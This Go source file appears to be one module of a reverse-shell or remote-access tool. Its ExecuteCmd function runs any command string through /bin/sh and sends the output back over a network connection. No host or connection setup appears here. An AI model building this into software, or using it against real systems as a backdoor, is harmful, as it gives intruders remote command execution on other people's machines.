// +build linux darwin freebsd !windows

package shell

import (
	"net"
	"os/exec"
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
